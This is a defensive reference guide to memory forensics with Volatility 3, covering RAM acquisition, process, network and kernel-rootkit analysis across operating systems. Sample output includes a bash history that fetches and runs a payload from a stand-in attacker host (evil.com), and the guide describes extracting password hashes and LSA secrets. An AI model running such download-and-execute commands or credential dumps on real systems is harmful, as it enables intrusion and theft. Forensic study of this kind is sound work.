# Memory Forensics for Reverse Engineering

Memory forensics extracts artifacts from RAM captures to reconstruct running processes, network connections, loaded modules, registry data, and injected code that never touches disk. For reverse engineering, it is the definitive method to recover unpacked payloads, decrypt C2 configs, find kernel-mode rootkits, and map the full memory-resident attack surface that static file analysis cannot reach [1](https://volatility3.readthedocs.io/en/latest/).

This reference covers acquisition, the Volatility 3 framework, OS-specific analysis, hidden code detection, kernel forensics, registry/prefetch carving, and malware config extraction from memory dumps. All commands assume Volatility 3 (`vol`) unless noted.

---

## 1. Memory Acquisition

Acquisition is the most fragile step. A bad dump corrupts every subsequent analysis. Choose the tool to match the platform, capture priority (full RAM vs. selective), and the evasiveness of the target.

### 1.1 Acquisition Tool Matrix

| Tool | Platform | Format | Notes |
|------|----------|--------|-------|
| FTK Imager | Windows | .mem / raw | GUI + CLI; also captures pagefile.sys [2](https://www.exterro.com/ftk-imager) |
| DumpIt | Windows | raw | One-click from Magnet Forensics; minimal footprint [3](https://www.magnetforensics.com/resources/magnet-dumpit/) |
| WinPmem | Windows | raw / AFF4 / ELF | Open source; Volatility's own acquisition driver; supports AFF4 with compression [4](https://github.com/Velocidex/WinPmem) |
| Belkasoft RAM Capturer | Windows | raw | Small footprint; extracts even when protected by anti-debug [5](https://belkasoft.com/ram-capturer) |
| LiME | Linux | raw / lime | Loadable kernel module; dumps via `/dev/mem` or direct phys mem [6](https://github.com/504ensicsLabs/LiME) |
| AVML | Linux | raw | Acquire Volatile Memory for Linux; no kernel module, uses `/proc/kcore` [7](https://github.com/microsoft/avml) |
| OSXPMem | macOS | raw / AFF4 | Port of WinPmem for macOS; requires SIP-reduced or root [8](https://github.com/google/rekall/blob/master/tools/osxpmem/README.md) |
| vmss2core | VMware | .vmem / .vmss | Converts VM snapshot/suspend files to raw dumps [9](https://labs.vmware.com/flings/vmss2core) |

### 1.2 Windows Acquisition

**WinPmem** is the recommended acquisition driver for Windows because it ships as a signed kernel driver and supports multiple output formats [4](https://github.com/Velocidex/WinPmem):

```bash
# Raw capture (fastest)
winpmem_mini.exe mem.raw

# AFF4 with compression (slower, smaller output)
winpmem_mini.exe --format aff4 mem.aff4
```

**DumpIt** is a single binary — no install, no dependencies. Run as Administrator from the directory where you want the dump [3](https://www.magnetforensics.com/resources/magnet-dumpit/):

```bash
DumpIt.exe                     # interactive, confirms path
DumpIt.exe /OUTPUT d:\dump.raw # silent, specify output
```

**FTK Imager** provides a GUI (File > Capture Memory) and a CLI (`ftkimager`) that can capture RAM and the pagefile in one pass [2](https://www.exterro.com/ftk-imager). It is heavier than DumpIt/WinPmem but integrates with the FTK ecosystem.

### 1.3 Linux Acquisition

**LiME** (Linux Memory Extractor) loads as a kernel module and dumps physical memory to disk or over the network [6](https://github.com/504ensicsLabs/LiME):

```bash
# Build the kernel module for the target kernel
cd LiME/src
make
# Dump to disk
insmod lime.ko "path=/tmp/mem.lime format=lime"
# Dump over TCP (receiver: nc -l 4444 > mem.lime)
insmod lime.ko "path=tcp:4444 format=lime"
```

**AVML** (Acquire Volatile Memory for Linux) needs no kernel module — it reads `/proc/kcore` — so it works on any running kernel without compilation [7](https://github.com/microsoft/avml):

```bash
avml mem.raw                     # full dump
avml --compress mem.raw.lz4      # compress on-the-fly
```

The tradeoff: `/proc/kcore` is limited by user-space page visibility on some hardened kernels, while LiME sees physical memory directly but requires building for the exact kernel.

### 1.4 macOS Acquisition

**OSXPMem** dumps macOS memory via a signed kernel extension [8](https://github.com/google/rekall/blob/master/tools/osxpmem/README.md):

```bash
sudo osxpmem mem.raw
sudo osxpmem --format aff4 mem.aff4  # compressed
```

macOS System Integrity Protection (SIP) must be disabled or at least reduced to load the kernel extension. On Apple Silicon, acquisition is significantly harder — the Secure Enclave and separate EFI memory regions are not fully accessible.

### 1.5 Virtual Machine Snapshots

VM snapshots are a free acquisition channel when the target runs in a VM:

| Source | Tool | Output |
|--------|------|--------|
| VMware .vmem (memory file) | Direct use | Volatility reads .vmem natively |
| VMware .vmss (suspend state) | `vmss2core` | Converts to raw `.vmem` |
| VMware .vmsn (snapshot) | `vmss2core` | Same conversion |
| Hyper-V .bin / .vsav | `vmm2img` (rekall) | Converts to raw |
| VirtualBox .sav | `vboxmanage` + conversion | Extract with VBoxManage debugvm |

```bash
# vmss2core conversion
vmss2core -W Windows-10.vmss mem.raw
vmss2core -L linux.vmss mem.raw
```

### 1.6 Hibernation & Pagefile

Windows hibernation files (`hiberfil.sys`) are compressed memory snapshots. Volatility's `windows.hibernation` plugin decompresses them [10](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.html):

```bash
vol -f hiberfil.sys windows.hibernation --dump
```

The pagefile (`pagefile.sys`) contains memory pages the OS swapped to disk. It is not a standalone dump but can be combined with a RAM dump for full coverage:

```bash
# Volatility 3: load pagefile as additional layer
vol -f mem.raw --pagefile pagefile.sys windows.pstree
```

### 1.7 Acquisition Drawbacks

- **Volatility**: RAM contents change during acquisition. The dump is a snapshot, not atomic — active processes may be incomplete.
- **Anti-forensics**: Direct Kernel Object Manipulation (DKOM) can hide processes from acquisition drivers that enumerate via kernel lists. A physically dumped page may contain stale/overwritten data.
- **GUI pages paged out**: On Windows, GUI subsystem pages (`desktop heap`, `session space`) are often paged to the pagefile and missing from a RAM-only dump. Combine with the pagefile.
- **Evasion**: Modern malware hooks `MmMapIoSpace`, `NtReadVirtualMemory`, or kernel callbacks that acquisition drivers rely on. LiME's direct phys-map read is the hardest for malware to intercept — but no method is bulletproof [11](https://www.sciencedirect.com/science/article/pii/S2666281721000286).

---

## 2. Volatility 3 Framework

Volatility 3 is the ground-up Python 3 rewrite of the Volatility memory forensics framework. It replaces the Python 2 Volatility 2 with a cleaner plugin model, built-in symbol table (ISF/JSON) management, and native support for Windows, Linux, and macOS memory dumps [1](https://volatility3.readthedocs.io/en/latest/).

### 2.1 Architecture

```
┌─────────────────────────────────────────────────────┐
│ vol (CLI entry point)                                │
│  ┌──────────────────────────────────────────────┐   │
│  │ Plugin Framework                              │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────────┐ │   │
│  │  │ windows. │ │  linux.  │ │    mac.      │ │   │
│  │  │ plugins  │ │ plugins  │ │  plugins     │ │   │
│  │  └──────────┘ └──────────┘ └──────────────┘ │   │
│  └──────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────┐   │
│  │ Memory Layers (abstraction stack)             │   │
│  │  RawLayer  │  ELFLayer  │  HiberLayer        │   │
│  │  VMEMLayer │  LimeLayer │  PagefileLayer     │   │
│  └──────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────┐   │
│  │ Symbol Tables (ISF/JSON)                      │   │
│  │  Windows: ntoskrnl.json, kdcom.json          │   │
│  │  Linux:   System.map -> ISF                   │   │
│  │  macOS:   kernel.json                         │   │
│  └──────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

The memory layer abstraction translates physical offsets to virtual addresses, handles address spaces (x86, x64, PAE), and decompresses formats (hibernation, AFF4). Plugins operate against a unified `context` object that resolves layers and symbols transparently [12](https://volatility3.readthedocs.io/en/latest/volatility3.framework.interfaces.html).

### 2.2 Symbol Tables (ISF/JSON)

Volatility 3 uses Intermediate Symbol Format (ISF) files — JSON dictionaries mapping type definitions, struct layouts, and symbol offsets. Unlike Volatility 2's hardcoded `vtypes`, ISF is autogenerated from debugging symbols (PDB on Windows, DWARF on Linux, Mach-O on macOS) and versioned [13](https://volatility3.readthedocs.io/en/latest/symbol-tables.html).

```bash
# Symbol table bundles ship with Volatility
ls /usr/local/lib/python3.*/site-packages/volatility3/symbols/
# Windows:   ntoskrnl.json, kdcom.json, nt.json, etc.
# Linux:     linux.json, kernel.json (built from System.map)
```

Generate a custom ISF for an unlisted kernel:

```bash
# Windows: use pdbconv.py from the Volatility repo
python3 pdbconv.py ntoskrnl.pdb ntoskrnl.json

# Linux: use dwarf2json (Volatility Labs)
python3 dwarf2json.py --elf /path/to/vmlinux > linux.json
```

Without the right symbol table, most plugins return an error — the ISF is the linchpin [14](https://github.com/volatilityfoundation/volatility3).

### 2.3 Volatility 2 vs. 3

| Feature | Volatility 2 | Volatility 3 |
|---------|-------------|-------------|
| Python | Python 2 (EOL) | Python 3.7+ |
| Plugin model | `volatility/plugins/` | `volatility3/framework/plugins/` with namespace prefix |
| Symbol format | Hardcoded `vtypes` + `overlays` | ISF/JSON; build from debug symbols |
| Linux/macOS | Limited, unstable | First-class support with ISF |
| KDBG scan | Required for profile detection | Automatic layer scanning |
| Performance | Single-process, slow | Caching, parallelizable; much faster on large dumps |
| Output format | Plain text, SQLite | JSON + text; pipe-friendly for automation |

Key migration note: Volatility 3 plugins use dot notation (`windows.pstree`), not Volatility 2's `--profile=Win10x64 --plugin=pstree` [14](https://github.com/volatilityfoundation/volatility3).

### 2.4 Basic Usage

```bash
# List available plugins
vol --help

# Automatically detect OS and list processes
vol -f mem.raw windows.pstree

# JSON output (machine-readable)
vol -f mem.raw windows.pstree --output=json

# Specify symbol table path (if not auto-detected)
vol -f mem.raw --symbol-dir /path/to/symbols windows.pstree
```

Volatility 3 auto-detects the OS by scanning the dump for KDBG (Windows kernel debugger block), known kernel signatures (Linux), or boot arguments (macOS). Provide a symbol directory if detection fails.

---

## 3. Windows Memory Forensics

### 3.1 Process Enumeration

Three process-listing plugins exist because each uses a different enumeration method — malware can hide from one but rarely all three [15](https://www.elastic.co/blog/hunting-memory).

**`windows.pstree`** — walks the active process list via `PsActiveProcessHead`, showing parent-child relationships:

```bash
vol -f mem.raw windows.pstree
```

```
PID  PPID  ImageFileName   Offset      Threads  Handles  SessionId  Wow64  CreateTime
4    0     System          0x8c0492c0  149      -        0          False  2025-06-01 08:00:00
440   4     smss.exe        0x8b2c3340  2        30       0          False  ...
560   544   csrss.exe       0x8b6d07d0  10       370      0          False  ...
588   544   wininit.exe     0x8b946880  3        81       0          False  ...
...
```

**`windows.pslist`** — same walk but flat list, no tree. Faster for grep/automation:

```bash
vol -f mem.raw windows.pslist
```

**`windows.psscan`** — scans physical memory for `EPROCESS` pool tags (`Proc`). Finds processes unlinked from `PsActiveProcessHead` by DKOM rootkits [16](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.psscan.html):

```bash
vol -f mem.raw windows.psscan
```

If `psscan` shows a process that `pslist` misses, you have found a hidden process — a strong indicator of malware unlinkng its EPROCESS.

### 3.2 DLLs and Kernel Modules

**`windows.dlllist`** — lists DLLs loaded per process via the PEB:

```bash
vol -f mem.raw windows.dlllist --pid 1234
```

```text
PID  Process  Base         Size    Name        Path
1234 sample   0x400000     0x4000  sample.exe  C:\Users\user\sample.exe
1234 sample   0x77000000   0x1a0000 ntdll.dll   C:\Windows\SYSTEM32\ntdll.dll
1234 sample   0x75000000   0x120000 KERNEL32.DLL C:\Windows\System32\KERNEL32.DLL
...
```

**`windows.modules`** — lists kernel modules (loaded drivers) by walking the `PsLoadedModuleList`:

```bash
vol -f mem.raw windows.modules
```

Cross-reference `windows.modules` with `windows.devicetree` to find drivers that register no device — a common kernel rootkit pattern.

### 3.3 Command Line and Environment

**`windows.cmdline`** — extracts the command line that started each process (stored in `EPROCESS`):

```bash
vol -f mem.raw windows.cmdline
```

```text
PID  Process     Args
4    System      System
1234 sample.exe C:\Users\user\sample.exe -hidden_c2 https://evil.com
```

**`windows.envars`** — dumps environment variables per process. Malware often stores decryption keys or config paths in transient env vars that never hit disk:

```bash
vol -f mem.raw windows.envars --pid 1234
```

### 3.4 Network Artifacts

**`windows.netscan`** — scans memory for `_TCPT_OBJECT`, `_UDP_OBJECT`, and other network structures. Preferred over `windows.netstat` on modern Windows [17](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.netscan.html):

```bash
vol -f mem.raw windows.netscan
```

```text
Offset  Proto   LocalAddr         LocalPort   ForeignAddr       ForeignPort  State        PID  Owner
0x...   TCP     192.168.1.5       4444        10.0.0.1          80           ESTABLISHED  1234 sample.exe
0x...   UDP     0.0.0.0           53          0.0.0.0           0                       2032 dns.exe
```

**`windows.netstat`** — older API, walks `AddrObjTable`. May miss connections on newer Windows builds. Prefer `netscan` for Windows 10+.

**`windows.sockets`** — lists socket objects by process. Shows listening ports even when no active connection exists.

### 3.5 Handles

**`windows.handles`** — every open handle per process (files, registry keys, mutexes, threads, events, tokens):

```bash
vol -f mem.raw windows.handles --pid 1234
```

```text
Offset    PID  Handle  Access   Type         GrantedAccess  Name
0x...     1234 0x8     0x1f0001 File         0x120089       \Device\HarddiskVolume2\Users\...
0x...     1234 0x24    0x1f0001 Mutant       0x120089       \Sessions\1\BaseNamedObjects\Global\evil_mutex
```

Mutex names are high-value IOCs — malware uses them for single-instance protection.

### 3.6 Injected Code Detection

**`windows.malfind`** — scans for memory regions with PAGE_EXECUTE_READWRITE (RWX) protection, anonymous mapped memory (no backing file), and heuristic patterns for shellcode [18](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.malfind.html):

```bash
vol -f mem.raw windows.malfind
```

```
PID  Process   Address    Protection      Hex Dump                          ASCII
1234 sample.exe 0x3b00000 RWX             4d 5a 90 00 03 00 00 00 04 00... MZ..........
```

Each result shows the raw hex from the suspect region decoded as ASCII. A region that is RWX (not RW then VirtualProtect to RX — the normal pattern) and contains code is almost certainly injected. The output includes a "Hex Dump" column for quick shellcode identification.

### 3.7 Device Tree and Callbacks

**`windows.devicetree`** — walks the kernel's device object tree, showing driver-to-device relationships:

```bash
vol -f mem.raw windows.devicetree
```

```text
DriverName     DeviceType     DeviceName               AttachedTo
\Driver\AV     FILE_DEVICE_UNKNOWN \Device\AV            \Driver\Tcpip
\Driver\evil   FILE_DEVICE_UNKNOWN \Device\EvilDriver    \Driver\Tcpip
```

An unknown driver attached to `\Driver\Tcpip` is a likely network filter (packet capture, traffic redirection, or firewall bypass).

**`windows.callbacks`** — enumerates registered kernel callbacks: process creation, image load, thread creation, registry modification, and object manager callbacks:

```bash
vol -f mem.raw windows.callbacks
```

```text
Type                    Callback        Module          Detail
ProcessCreate           0xfffff800...   evil.sys        0x...
ImageLoad               0xfffff800...   evil.sys        NotifyRoutine
Registry                0xfffff800...   evil.sys        RegistryCallback
```

Malware that registers a `RegistryCallback` can hide registry keys from `regedit` and live forensics tools.

### 3.8 Credential Extraction

**`windows.hashdump`** — extracts the SAM registry hive and parses NTLM hashes:

```bash
vol -f mem.raw windows.hashdump
```

```text
User   RID   LMHash         NTHash
Admin  500   aad3b435b51404ee aad3b435b51404ee  (blank/disabled)
user   1001  0f2a7b...       5ab3fc...
```

**`windows.cachedump`** — extracts domain cached credentials (NL$KM/MSCASH):

```bash
vol -f mem.raw windows.cachedump
```

**`windows.lsadump`** — extracts LSA secrets from the `HKLM\SECURITY` hive in memory:

```bash
vol -f mem.raw windows.lsadump
```

These plugins are primarily for incident response, but in a reversing context they confirm credential-stealing functionality in a sample.

### 3.9 Registry

**`windows.registry`** — lists registry hives loaded in memory:

```bash
vol -f mem.raw windows.registry
```

```text
Hive          Path                                      FileName
\REGISTRY\... \SystemRoot\System32\config\SYSTEM        SYSTEM
\REGISTRY\... \SystemRoot\System32\config\SOFTWARE       SOFTWARE
\REGISTRY\... \SystemRoot\System32\config\SAM            SAM
\USER\...     \Users\user\NTUSER.DAT                    NTUSER.DAT
```

**`windows.registry.printkey`** — prints registry keys and values from a specific hive or path:

```bash
vol -f mem.raw windows.registry.printkey --key "Microsoft\Windows\CurrentVersion\Run"
```

```text
Key:  \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Value   Data
OneDrive "C:\Users\user\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
evil     "C:\Users\user\AppData\Roaming\svchost.exe"
```

### 3.10 File Scanning

**`windows.filescan`** — scans memory for `_FILE_OBJECT` pool allocations to find files open or referenced at capture time:

```bash
vol -f mem.raw windows.filescan
```

```text
Offset    Name                                     Size
0x...     \Users\user\AppData\Local\Temp\payload.exe 123456
0x...     \Users\user\Desktop\document.pdf.lnk
```

Cross-reference with `windows.dlllist` to spot DLLs loaded from `AppData\Local\Temp` (a common sideloading technique).

### 3.11 Timelining

**`windows.timeliner`** — merges timestamps from processes, file objects, registry keys, network connections, and event log entries into a single sorted timeline [19](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.timeliner.html):

```bash
vol -f mem.raw windows.timeliner
```

```text
Timestamp               Activity
2025-06-01 08:00:00     Process created: svchost.exe (PID 820)
2025-06-01 08:00:05     File opened: \Windows\Temp\setup.msi
2025-06-01 08:00:10     Registry set: \REGISTRY\...\Run\WinUpdate
2025-06-01 08:00:12     Network connection: 192.168.1.5:4444 -> 10.0.0.1:80
```

The timeliner is the single most useful plugin for reconstructing the order of events in an incident.

---

## 4. Linux Memory Forensics

### 4.1 Process Enumeration

**`linux.pstree`** — walks the `task_struct` list via `init_task`:

```bash
vol -f mem.lime linux.pstree
```

```
PID  PPID  Name         Flags      State    Uid   Gid   Start Time
1    0     init         0x420080   S        0     0     2025-06-01 08:00:00
1234 1     bash         0x420100   S        1000  1000  2025-06-01 08:05:00
...
```

**`linux.pslist`** — flat list equivalent. **`linux.psscan`** — scans physical memory for `task_struct` structures via `PID`/`comm` signatures; finds processes unlinked from the list by LD_PRELOAD rootkits or kernel modules hiding `/proc` entries.

### 4.2 Process Memory Maps

**`linux.proc.Maps`** — reads `/proc/<pid>/maps` equivalent from memory:

```bash
vol -f mem.lime linux.proc.Maps --pid 1234
```

```text
Start           End             Flags   Pgoff   Inode   Path
0x400000        0x500000        r-xp    0       123456  /usr/bin/evil
0x600000        0x700000        rw-p    1000    123456  /usr/bin/evil
0x7ffff7a00000  0x7ffff7b00000  rwxp    0       0       [heap]
0x7ffff7b00000  0x7ffff7c00000  rwx     -       -       [vdso]  (anonymous)
```

Anonymous RWX mappings (`[heap]` without a backing file, or any segment with `rwx` flags) are suspicious — especially for processes that are not JIT compilers.

### 4.3 Bash History

**`linux.bash`** — extracts bash command history from memory (including commands that the user never `history`-saved, still in the process buffer):

```bash
vol -f mem.lime linux.bash
```

```text
PID  Process  Time                 Command
1234 bash     2025-06-01 08:10:00 cd /tmp
1234 bash     2025-06-01 08:10:05 wget http://evil.com/payload.sh
1234 bash     2025-06-01 08:10:10 chmod +x payload.sh
1234 bash     2025-06-01 08:10:15 ./payload.sh
```

### 4.4 Network

**`linux.netstat`** — enumerates network sockets via `net` namespace structures:

```bash
vol -f mem.lime linux.netstat
```

```text
Protocol  Local Address        Foreign Address      State        PID/Process
TCP       0.0.0.0:4444         0.0.0.0:0            LISTEN       1234/evil
TCP       192.168.1.5:4444     10.0.0.1:80          ESTABLISHED  1234/evil
```

The absence of a listening socket on disk (`/proc/<pid>/net/tcp` may be hidden) but visible in a memory dump is a rootkit indicator.

### 4.5 Malfind (Linux)

**`linux.malfind`** — scans for anonymous RWX memory regions and dumps suspicious pages:

```bash
vol -f mem.lime linux.malfind --pid 1234
```

```text
PID  Process   Start      End        Protection  Hex Dump
1234 evil      0x7f...    0x7f...    RWX         \x90\x90\x90\x90...
```

### 4.6 Kernel Rootkit Detection

Volatility 3 has an extensive suite of kernel integrity plugins for Linux:

| Plugin | Detects |
|--------|---------|
| `linux.check_afinfo` | Hooks in `/proc` file operation structures (seq_file operations) [20](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.linux.check_afinfo.html) |
| `linux.check_creds` | Credential structure manipulation (e.g., `cred->uid = 0` to escalate privileges) |
| `linux.check_fop` | File operations (`file_operations`) structure hooking; common rootkit technique |
| `linux.check_idt` | Interrupt Descriptor Table modifications (IDT hooking on 32-bit x86) |
| `linux.check_modules` | Compares loaded modules from kernel list vs. sysfs. Finds hidden kernel modules |
| `linux.check_syscall` | Syscall table hooking — the classic rootkit technique; compares `sys_call_table` entries [21](https://www.crowdstrike.com/blog/linux-kernel-rootkits/) |
| `linux.kernel_opcodes` | Dumps kernel code sections for static analysis; detect int 0x80|sysenter|syscall hooks |
| `linux.dynamic_kernel_memory_allocation` | Lists `vmalloc` allocated regions; find kernel memory allocated outside normal module loading |
| `linux.iomem` | Dumps `iomem` regions; find physical memory manipulation |
| `linux.tty_check` | TTY line discipline hijacking (log keystrokes from `tty_operations`) |
| `linux.keyutils` | Check for keylogger-related structures |

```bash
# Full kernel integrity sweep
vol -f mem.lime linux.check_syscall
vol -f mem.lime linux.check_modules
vol -f mem.lime linux.check_fop
vol -f mem.lime linux.check_idt
```

A syscall hook example output:

```text
Table Name  Index  Current Address      Symbol                    Hooked By
sys_call_table 2    0xffffffff81012345  __x64_sys_open            0xffffffff81a00000  (unkn)
sys_call_table 59   0xffffffff81034567  __x64_sys_execve          0xffffffff81a00100  (unkn)
```

A rootkit hooks `sys_open` to hide files, `sys_execve` to hide processes, and `sys_getdents` to hide directory entries [21](https://www.crowdstrike.com/blog/linux-kernel-rootkits/).

---

## 5. macOS Forensics

### 5.1 Process Enumeration

**`mac.pstree`** — walks the `all_task` list (the macOS equivalent of the Linux `task_struct` list):

```bash
vol -f mem.macho mac.pstree
```

```text
PID  PPID  Name          Uid  Start Time
1    0     launchd       0    2025-06-01 08:00:00
...
```

**`mac.pslist`** — flat list. **`mac.malfind`** — scans for executable anonymous RWX pages, same heuristic as Windows/Linux malfind.

### 5.2 Network

**`mac.netstat`** — walks the socket list:

```bash
vol -f mem.macho mac.netstat
```

### 5.3 Kernel Integrity

macOS-specific kernel hook checks:

| Plugin | Purpose |
|--------|---------|
| `mac.check_syscall_shadow` | Detects shadow syscall table attack (CVE-2023-32434 style) where the real syscall table is replaced with a malicious copy [22](https://objective-see.org/blog/blog_0x7D.html) |
| `mac.check_syscall` | Standard syscall table hook detection |
| `mac.check_ipcompression` | Checks kernel IP compression filter registration — a macOS rootkit technique that registers a network filter at the IP layer to intercept/redirect traffic unseen by userspace tools |

macOS forensics is less mature than Windows/Linux in Volatility 3. Many plugins require building ISF files from the kernel binary and KDK symbols, and Apple's kernel cache (`kernelcache`) must be decompressed first with `kernelcache-decoder` or similar [23](https://github.com/volatilityfoundation/volatility3/issues/467).

---

## 6. Process Memory Extraction

Extracting executables, DLLs, and shellcode from memory dumps is the most common RE task done in Volatility.

### 6.1 Dumping Full Processes

**`windows.memdump`** — dumps the entire accessible address space of a process:

```bash
vol -f mem.raw windows.memdump --pid 1234 --dump
# Output: pid.1234.dmp
```

The `.dmp` file is a raw dump of the process's virtual address space. Load it in a disassembler (IDA, Ghidra, x64dbg) to analyze the unpacked module.

### 6.2 Dumping Executables and DLLs

**`windows.dumpfiles`** — dumps specific files by `_FILE_OBJECT` offset (from `windows.filescan`) or by PID:

```bash
vol -f mem.raw windows.dumpfiles --pid 1234
# Output: file.0x....dat (each loaded file image)
```

To dump only the main executable from a process:

```bash
vol -f mem.raw windows.dumpfiles --virtaddr 0x400000 --pid 1234
```

### 6.3 VAD (Virtual Address Descriptor) Analysis

**`windows.vadinfo`** — dumps per-region VAD information for a process:

```bash
vol -f mem.raw windows.vadinfo --pid 1234
```

```text
VAD Node    Start     End         Tag  Flags      Protection
0x...       0x10000   0x20000     VadS Commit     PAGE_READONLY
0x...       0x30000   0x3f000     VadS Commit     PAGE_EXECUTE_READWRITE  ← suspicious
0x...       0x400000  0x500000    VadM Private    PAGE_EXECUTE_WRITECOPY  ← image
```

**`windows.vadtree`** — hierarchical tree view of VAD nodes.

VAD analysis is the definitive way to find manually-mapped PE images (reflective DLL injection), because a PE loaded via `LoadLibrary` has a VAD with `VadM` (mapped) tag, while a manually-mapped PE has `VadS` (private) tag with no backing file [24](https://www.for511.com/memory-forensics/).

### 6.4 Extracting Shellcode Regions

Use `malfind` output addresses to dump specific shellcode regions:

```bash
# Dump a specific region found by malfind
vol -f mem.raw windows.memdump --pid 1234 --base 0x3b00000 --size 0x1000 --dump
```

The resulting dump is raw bytes; analyze with `ndisasm`, `capstone`, or a disassembler.

### 6.5 Extracting Unpacked Payloads via DLL Dump

Dump every DLL a process loaded (useful when the unpacked payload is an injected DLL):

```bash
vol -f mem.raw windows.dlllist --pid 1234
vol -f mem.raw windows.dumpfiles --pid 1234
# Search for the DLL on disk in the output directory
```

---

## 7. Hidden / Injected Code Detection

### 7.1 Malfind Signatures

`windows.malfind` detects three categories of anomalous memory:

| Category | Protection | Tag | Typical cause |
|----------|-----------|-----|--------------|
| Classic shellcode injection | PAGE_EXECUTE_READWRITE | VadS private | VirtualAllocEx → WriteProcessMemory → CreateRemoteThread |
| Process hollowing | PAGE_EXECUTE_READWRITE | VadS private | ZwUnmapViewOfSection → VirtualAllocEx → WriteProcessMemory → SetThreadContext |
| Reflective DLL | PAGE_EXECUTE_READWRITE | VadS private (no backing file) | Manual PE mapping in-memory |
| Heuristic anomaly | PAGE_EXECUTE or PAGE_READWRITE (inverted) | Any | Polymorphic shellcode engines |

The RWX pattern (heap or anonymous region that is simultaneously writable and executable) is the dominant signature in `malfind` output. Normal modules map as `PAGE_EXECUTE_WRITECOPY` (the image section) or `PAGE_READWRITE` (data section). RWX is rare and almost never legitimate [18](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.malfind.html).

### 7.2 Orphan Threads

Threads whose start address points to a region not mapped by any loaded DLL or EXE are "orphans" — the thread callback location is outside any known module. Cross-reference with `windows.handles` to find the thread's start address:

```bash
vol -f mem.raw windows.handles --pid 1234 --handle-type Thread
```

### 7.3 Unlinked EPROCESS Detection

`windows.psscan` finds EPROCESS structures by scanning memory for the `Proc` pool tag, not by walking a list. An EPROCESS whose `ActiveProcessLinks.Flink` does not point back to `PsActiveProcessHead` is unlinked — the process is hidden from `pslist` and Task Manager [16](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.psscan.html):

```bash
# Cross-reference
vol -f mem.raw windows.pslist
vol -f mem.raw windows.psscan
```

Any process in `psscan` but not in `pslist` = DKOM-hidden. Dump it with `memdump` and analyze.

### 7.4 Process Hollowing Detection

Process hollowing replaces the memory of a legitimate process (typically `svchost.exe`, `notepad.exe`, `iexplore.exe`) with malicious code. Indicators:

- The executable's `.text` section has `PAGE_EXECUTE_READWRITE` instead of `PAGE_EXECUTE`.
- `windows.cmdline` shows a normal command (`C:\Windows\System32\svchost.exe -k netsvcs`), but `windows.dlllist` shows the loaded DLLs of a completely different application.
- `windows.vadtree` shows the image base as a `VadS Private` region (it should be `VadM Mapped` if it is a legitimate mapped PE).

### 7.5 Hollowfind (Third Party)

`hollowfind` is a Volatility 3 extension (and was a Volatility 2 plugin) specifically for detecting process hollowing. It compares the PE header in memory against the PEB's image base and reports discrepancies [25](https://github.com/sysopfb/hollowfind).

Detection principle: in process hollowing, the original PE is unmapped and replaced. The PEB's `ImageBaseAddress` may still point to the old mapped file, but the VAD shows `VadS` (private) instead of `VadM` (mapped), and the actual PE at the base address has been overwritten with the malicious one.

---

## 8. Kernel Mode Analysis

### 8.1 Kernel Module Enumeration

**`windows.modules`** — lists kernel modules from `PsLoadedModuleList`:

```bash
vol -f mem.raw windows.modules
```

```text
Offset       Name               Base             Size    FileName
0xfffff800... ntoskrnl.exe      0xfffff800...    0x...   \SystemRoot\system32\ntoskrnl.exe
0xfffff800... evil.sys          0xfffff800...    0x...   \??\C:\Users\user\AppData\Local\evil.sys
```

A kernel module loaded from a user-writable path is a red flag.

### 8.2 SSDT (System Service Descriptor Table) Hooks

Windows rootkits hook the SSDT to intercept system calls. **`windows.ssdt`** in Volatility 2 enumerated these; in Volatility 3, the equivalent check is more indirect — cross-reference `windows.callbacks` with `windows.modules`:

```bash
# Check for unusual kernel image loads
vol -f mem.raw windows.modules | grep -v "\\SystemRoot\\"
```

The SSDT address is stored in `KeServiceDescriptorTable`. A rootkit that overwrites a syscall entry redirects it to its own code. Compare the current SSDT with known-good for the kernel version — any mismatch is a hook.

### 8.3 IDT/GDT Inspection

**`windows.idt`** — dumps the Interrupt Descriptor Table. On x86, malware can redirect interrupt handlers (e.g., int 0x2e for syscall) to its own code. On x64, the IDT is read-only in normal operation (protected by `KI_USER_SHARED_DATA`), but a hypervisor or vulnerable driver can still modify it.

**`windows.gdt`** — dumps the Global Descriptor Table entries. Rarely hooked directly, but segment descriptor modification is a known VM escape technique.

### 8.4 Driver Objects and IRP Hooks

**`windows.driverirp`** — examines each driver's `MajorFunction` table (IRP handlers). A rootkit that intercepts read/write operations (e.g., a file-hiding rootkit) replaces entries in the target driver's IRP function table:

```bash
vol -f mem.raw windows.driverirp --driver \Driver\evil
```

```text
MajorFunction  Index  Address            Symbol
IRP_MJ_CREATE  0x00   0xfffff800...      nt!IopParseDevice
IRP_MJ_READ    0x03   0xfffff800...      evil+0x1234     ← hooked
IRP_MJ_WRITE   0x04   0xfffff800...      evil+0x1300     ← hooked
```

An IRP handler pointing to a module other than the owning driver or to an anonymous address is hooked. This is how file-hiding rootkits intercept read/write calls to conceal their files [26](https://www.crowdstrike.com/blog/windows-kernel-rootkits/).

### 8.5 Kernel Callback Enumeration

**`windows.callbacks`** (covered in §3.7) registers callbacks at multiple notification points:

- `PsSetCreateProcessNotifyRoutine` — notified on every process creation/termination
- `PsSetCreateThreadNotifyRoutine` — notified on thread creation
- `PsSetLoadImageNotifyRoutine` — notified on every image (DLL/EXE) load
- `CmRegisterCallback` — notified on every registry operation
- `ObRegisterCallbacks` — notified on handle open/duplicate

A rootkit can register a `RegistryCallback` to hide keys from `RegQueryValueKey` — the callback intercepts the registry operation and filters results in real-time.

### 8.6 DKOM Detection

Direct Kernel Object Manipulation (DKOM) modifies kernel structures in-place to hide objects. Detection strategies:

| Technique | How to detect |
|-----------|---------------|
| EPROCESS unlink | `pslist` vs `psscan` discrepancy |
| Token privilege escalation | `windows.psscan` shows `Token`; compare `Privileges` against expected |
| Hidden driver | `modules` vs `devicetree` vs `psscan` for driver objects |
